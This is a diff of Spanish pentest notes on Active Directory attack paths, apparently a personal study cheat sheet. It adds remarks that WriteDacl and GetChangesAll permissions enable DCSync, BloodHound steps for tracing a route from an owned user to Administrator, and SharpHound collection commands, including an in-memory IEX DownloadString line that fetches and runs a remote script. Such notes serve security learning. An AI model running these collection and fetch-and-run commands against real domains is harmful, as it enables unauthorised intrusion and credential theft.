@@ -26,6 +26,7 @@ Tags: #AD #BloodHound #SharpHound #Kali #Parrot
 3. 'Schema Admins': Los usuarios en este grupo pueden hacer cambios en el esquema de AD, que es la definición de objetos y atributos que pueden ser creados y almacenados en AD.
 4. 'Account Operators': Pueden administrar las cuentas de usuario y grupos dentro de un dominio, pero no pueden modificar los miembros de los grupos de administradores ni cambiar la configuración de los servidores de dominio. Por lo que puedes crear y modificar cuentas de usuario.
 5. 'Exchange Windows Permissions': Puede otorgar los permisos necesarios para que Exchange pueda interactuar con objetos de Active Directory, como usuarios, buzones y grupos. Los miembros de este grupo tienen permisos especiales en contenedores específicos de AD para realizar tareas como crear, modificar y administrar objetos relacionados con Exchange. 
+	- Si se tiene el permiso de 'WriteDacl' se puede hacer un ataque de 'DCSync'
 6. 'Backup Operators': Pueden realizar copias de seguridad y restaurar archivos en un servidor, independientemente de los permisos de acceso a esos archivos.
 7. 'Server Operators': Pueden realizar tareas de mantenimiento en servidores de dominio.
 8. 'Guests': Es un grupo que por defecto tiene privilegios mínimos, y generalmente se utiliza para proporcionar acceso temporal o limitado a la red.
@@ -48,14 +49,16 @@ Los 'ActiveDirectoryRights' incluyen, pero no se limitan a:
 5. GenericAll: Control total sobre el objeto, incluyendo todos los derechos anteriores.
 6. WriteDacl: Modificar la lista de control de acceso discrecional (DACL).  
 7. WriteOwner: Cambiar el propietario de un objeto.
+8. GetChangesAll: Es un permiso en Active Directory que permite replicar todos los datos, incluso contraseñas; es clave para ataques como 'DCSync'.
 ```
 
 ## BloodHound 
 
 * [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries/tree/master/BloodHound_Custom_Queries)
+* [Bloodhound](https://www.kali.org/tools/bloodhound/)
 
 ```bash 
-❯ bloodhound-setup           # Inicia el neo4j 'http:localhost:7474'   
+❯ bloodhound-setup           # Iniciar el neo4j 'http:localhost:7474'   
 ❯ BloodHound --no-sandbox    # Ejecutar Bloodhound y se abre en la web 'http://localhost:8080/ui/login'
 
 Notas: 
@@ -78,9 +81,9 @@ Enumerar lo siguiente en BloodHound en 'Analysis':
 Una vez obtenido un usuario:
 
 # Manera 1
-	1. Agregar la opción 'Mark User as Owned'
-	2. Darle click al usuario y se seleccionará el menú 'Node Info'
-	3. Seleccionar la opción 'Reachable High Value Targets' para ver el camino y lo que deberiamos de hacer para ser usuario 'Administrator'
+1. Agregar la opción 'Mark User as Owned'
+	1. Seleccionar la opción 'Reachable High Value Targets' para ver el camino y lo que deberiamos de hacer para ser usuario 'Administrator' en 'Overview'
+	2. Seleccionar 'First Degree Object Control' en 'Outbound control rights' para ver si el usuario contempla alguna acción 
 ```
 
 ## SharpHound 
@@ -88,7 +91,14 @@ Una vez obtenido un usuario:
 * [SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)
 * [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)
 
+```powershell 
+❯ Import-Module .\SharpHound.ps1       # Importar el modulo, tambien se puede hacer con el '.exe'
+
+❯ Invoke-BloodHound -CollectionMethod All
+```
+
 ```powershell
+# Importar el modulo en memoria
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 
 
 ❯ Invoke-BloodHound -CollectionMethod All     
